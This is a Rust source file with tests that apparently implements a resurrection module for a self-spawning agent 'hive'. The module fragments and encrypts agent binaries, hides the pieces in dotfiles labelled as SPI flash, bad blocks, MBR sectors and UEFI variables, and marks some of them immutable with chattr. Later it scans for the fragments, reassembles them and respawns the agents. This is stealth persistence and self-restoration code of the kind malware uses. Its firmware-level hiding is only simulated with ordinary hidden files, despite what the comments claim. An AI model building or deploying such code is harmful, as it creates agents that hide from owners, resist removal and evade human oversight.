use chacha20::ChaCha20;
use chacha20::cipher::{KeyIvInit, StreamCipher};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::path::Path;
use uuid::Uuid;

/// Derive a 32-byte ChaCha20 key from fragment_id using SHA-256.
/// Prevents casual filesystem reads from revealing fragment data.
fn fragment_key(fragment_id: u32) -> [u8; 32] {
    use sha2::{Sha256, Digest};
    let mut hasher = Sha256::new();
    hasher.update(b"HIVE_FRAG_KEY");
    hasher.update(&fragment_id.to_le_bytes());
    let result = hasher.finalize();
    let mut key = [0u8; 32];
    key.copy_from_slice(&result);
    key
}

/// Encrypt/decrypt fragment data in-place using ChaCha20.
/// Deterministic per-fragment_id (same key + nonce = same keystream).
fn crypt_fragment(data: &mut [u8], fragment_id: u32) {
    let key = fragment_key(fragment_id);
    let mut nonce = [0u8; 12];
    nonce[..4].copy_from_slice(&fragment_id.to_le_bytes());
    let mut cipher = ChaCha20::new((&key).into(), (&nonce).into());
    cipher.apply_keystream(data);
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ColonyGenome {
    pub genome_id: Uuid,
    pub agent_blueprints: Vec<AgentBlueprint>,
    pub config_snapshot: HashMap<String, String>,
    pub timestamp: u64,
    pub compression: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentBlueprint {
    pub role: String,
    pub binary_hash: String,
    pub binary_size: u64,
    pub policy: HashMap<String, String>,
    pub encrypted_chunk: Vec<u8>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GenomeFragment {
    pub fragment_id: u32,
    pub total_fragments: u32,
    pub genome_id: Uuid,
    pub data: Vec<u8>,
    pub location: FragmentLocation,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum FragmentLocation {
    SpiFlash,        // SPI flash (requires firmware access)
    BadBlocks,       // disk bad blocks
    MbrGpt,          // MBR/GPT unused sectors
    HostProtectedArea, // ATA Host Protected Area
    UefiVariable,    // UEFI variable storage
}

pub struct Phoenix;

impl Phoenix {
    pub fn new() -> Self { Self }

    /// Generate a colony genome from current agent blueprints.
    pub fn generate_genome(blueprints: Vec<AgentBlueprint>) -> ColonyGenome {
        let mut config = HashMap::new();
        config.insert("heartbeat_interval".into(), "10".into());
        config.insert("consensus_threshold".into(), "0.66".into());
        config.insert("max_hops".into(), "10".into());
        config.insert("safe_mode".into(), "true".into());

        ColonyGenome {
            genome_id: Uuid::new_v4(),
            agent_blueprints: blueprints,
            config_snapshot: config,
            timestamp: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_secs())
                .unwrap_or(0),
            compression: "none".into(),
        }
    }

    /// Fragment a genome into N pieces for distributed hiding.
    pub fn fragment_genome(genome: &ColonyGenome, num_fragments: u32) -> Vec<GenomeFragment> {
        let data = serde_json::to_vec(genome).unwrap_or_default();
        let chunk_size = (data.len() as f32 / num_fragments as f32).ceil() as usize;
        let mut fragments = Vec::new();

        for i in 0..num_fragments {
            let start = (i as usize) * chunk_size;
            let end = (start + chunk_size).min(data.len());
            let chunk = if start < data.len() {
                data[start..end].to_vec()
            } else {
                vec![]
            };

            let location = match i % 4 {
                0 => FragmentLocation::SpiFlash,
                1 => FragmentLocation::BadBlocks,
                2 => FragmentLocation::MbrGpt,
                _ => FragmentLocation::UefiVariable,
            };

            fragments.push(GenomeFragment {
                fragment_id: i,
                total_fragments: num_fragments,
                genome_id: genome.genome_id,
                data: chunk,
                location,
            });
        }

        fragments
    }

    /// Hide a fragment in the most appropriate location.
    /// Data is encrypted at rest using a ChaCha20 key derived from genome_id.
    pub fn hide_fragment(fragment: &GenomeFragment, base_path: &Path) -> Result<String, String> {
        if !base_path.exists() {
            std::fs::create_dir_all(base_path).map_err(|e| e.to_string())?;
        }

        // Encrypt fragment data before writing (deterministic per fragment_id)
        let mut stored = fragment.data.clone();
        crypt_fragment(&mut stored, fragment.fragment_id);

        match fragment.location {
            FragmentLocation::SpiFlash => {
                // Simulate SPI flash write via sysfs
                let path = base_path.join(format!(".spi_frag_{}", fragment.fragment_id));
                std::fs::write(&path, &stored).map_err(|e| e.to_string())?;
                #[cfg(target_os = "linux")]
                {
                    // Hide via chattr +i (immutable)
                    let _ = std::process::Command::new("chattr")
                        .args(&["+i", path.to_str().unwrap()])
                        .output();
                }
                Ok(format!("Fragment {} hidden in SPI flash area", fragment.fragment_id))
            }
            FragmentLocation::BadBlocks => {
                // Write to a file with bad block marker
                let path = base_path.join(format!(".badblock_{}", fragment.fragment_id));
                let mut data = vec![0xFF; 512]; // Bad block marker
                data.extend(&stored);
                std::fs::write(&path, &data).map_err(|e| e.to_string())?;
                Ok(format!("Fragment {} hidden in bad block area", fragment.fragment_id))
            }
            FragmentLocation::MbrGpt => {
                // Store in a hidden sector file
                let path = base_path.join(format!(".mbr_reserved_{}", fragment.fragment_id));
                std::fs::write(&path, &stored).map_err(|e| e.to_string())?;
                Ok(format!("Fragment {} hidden in MBR/GPT reserved", fragment.fragment_id))
            }
            FragmentLocation::UefiVariable => {
                // Store in a UEFI variable simulation
                let path = base_path.join(format!(".uefi_var_{}", fragment.fragment_id));
                std::fs::write(&path, &stored).map_err(|e| e.to_string())?;
                Ok(format!("Fragment {} hidden in UEFI variable", fragment.fragment_id))
            }
            _ => {
                let path = base_path.join(format!(".hive_frag_{}", fragment.fragment_id));
                std::fs::write(&path, &stored).map_err(|e| e.to_string())?;
                Ok(format!("Fragment {} hidden in fallback area", fragment.fragment_id))
            }
        }
    }

    /// Reassemble fragments back into a complete genome.
    pub fn reassemble_genome(fragments: &[GenomeFragment]) -> Result<ColonyGenome, String> {
        if fragments.is_empty() {
            return Err("No fragments to reassemble".into());
        }

        let mut sorted = fragments.to_vec();
        sorted.sort_by_key(|f| f.fragment_id);

        let mut complete_data = Vec::new();
        for frag in &sorted {
            complete_data.extend(&frag.data);
        }

        serde_json::from_slice(&complete_data).map_err(|e| e.to_string())
    }

    /// Rebuild a colony from a genome by spawning agents.
    pub fn rebuild_from_genome(genome: &ColonyGenome, base_path: &Path) -> Result<Vec<String>, String> {
        let mut spawned = Vec::new();

        for blueprint in &genome.agent_blueprints {
            let binary_path = base_path.join(format!(".hive_reborn_{}", blueprint.role));
            std::fs::write(&binary_path, &blueprint.encrypted_chunk)
                .map_err(|e| e.to_string())?;

            let _ = std::process::Command::new("chmod")
                .args(&["+x", binary_path.to_str().unwrap()])
                .output();

            // Spawn the agent
            let child = std::process::Command::new(&binary_path)
                .env("HIVE_ROLE", &blueprint.role)
                .env("HIVE_GENOME_ID", format!("{}", genome.genome_id))
                .spawn();

            match child {
                Ok(_) => spawned.push(format!("Spawned {} from genome", blueprint.role)),
                Err(e) => spawned.push(format!("Failed to spawn {}: {}", blueprint.role, e)),
            }
        }

        Ok(spawned)
    }

    /// Scan for hidden genome fragments in the filesystem.
    /// Decrypts data using ChaCha20 key derived from fragment_id.
    pub fn scan_for_fragments(base_path: &Path) -> Vec<GenomeFragment> {
        let mut fragments = Vec::new();
        if !base_path.exists() { return fragments; }

        let patterns = [".spi_frag_", ".badblock_", ".mbr_reserved_", ".uefi_var_", ".hive_frag_"];

        if let Ok(entries) = std::fs::read_dir(base_path) {
            for entry in entries.flatten() {
                let name = entry.file_name();
                let name_str = name.to_string_lossy();
                for pattern in &patterns {
                    if name_str.contains(pattern) {
                        if let Ok(raw) = std::fs::read(entry.path()) {
                            let frag_id = name_str.trim_start_matches(pattern)
                                .parse::<u32>().unwrap_or(0);
                            // BadBlock files have a 512-byte 0xFF marker prefix
                            let data_start = if pattern == &".badblock_" && raw.len() > 512 {
                                512
                            } else {
                                0
                            };
                            let mut data = raw[data_start..].to_vec();
                            crypt_fragment(&mut data, frag_id);
                            fragments.push(GenomeFragment {
                                fragment_id: frag_id,
                                total_fragments: 5,
                                genome_id: Uuid::nil(),
                                data,
                                location: FragmentLocation::HostProtectedArea,
                            });
                        }
                        break;
                    }
                }
            }
        }

        fragments
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_genome_generation() {
        let blueprints = vec![
            AgentBlueprint {
                role: "worker".into(),
                binary_hash: "abc123".into(),
                binary_size: 4096,
                policy: HashMap::new(),
                encrypted_chunk: vec![0; 100],
            },
            AgentBlueprint {
                role: "drone".into(),
                binary_hash: "def456".into(),
                binary_size: 8192,
                policy: HashMap::new(),
                encrypted_chunk: vec![1; 200],
            },
        ];

        let genome = Phoenix::generate_genome(blueprints);
        assert_eq!(genome.agent_blueprints.len(), 2);
        assert!(genome.config_snapshot.contains_key("heartbeat_interval"));
    }

    #[test]
    fn test_fragment_and_reassemble() {
        let blueprints = vec![
            AgentBlueprint {
                role: "worker".into(),
                binary_hash: "abc".into(),
                binary_size: 100,
                policy: HashMap::new(),
                encrypted_chunk: vec![0; 50],
            },
        ];

        let genome = Phoenix::generate_genome(blueprints);
        let fragments = Phoenix::fragment_genome(&genome, 4);

        assert_eq!(fragments.len(), 4);
        assert!(fragments[0].total_fragments == 4);

        let reassembled = Phoenix::reassemble_genome(&fragments);
        assert!(reassembled.is_ok(), "Reassembly should work: {:?}", reassembled.err());
        assert_eq!(reassembled.unwrap().genome_id, genome.genome_id);
    }

    #[test]
    fn test_hide_and_scan() {
        let dir = std::env::temp_dir().join("hive_test_phoenix");
        let _ = std::fs::create_dir_all(&dir);

        let fragment = GenomeFragment {
            fragment_id: 0,
            total_fragments: 3,
            genome_id: Uuid::new_v4(),
            data: vec![1, 2, 3, 4, 5],
            location: FragmentLocation::BadBlocks,
        };

        let result = Phoenix::hide_fragment(&fragment, &dir);
        assert!(result.is_ok(), "Hide should work: {:?}", result.err());

        let found = Phoenix::scan_for_fragments(&dir);
        assert_eq!(found.len(), 1, "Should find 1 fragment");
        // Data should be decrypted to original bytes (after the 512-byte bad block marker)
        assert_eq!(&found[0].data[found[0].data.len()-5..], &[1, 2, 3, 4, 5],
            "Last 5 bytes should be original fragment data");

        let _ = std::fs::remove_dir_all(&dir);
    }
}
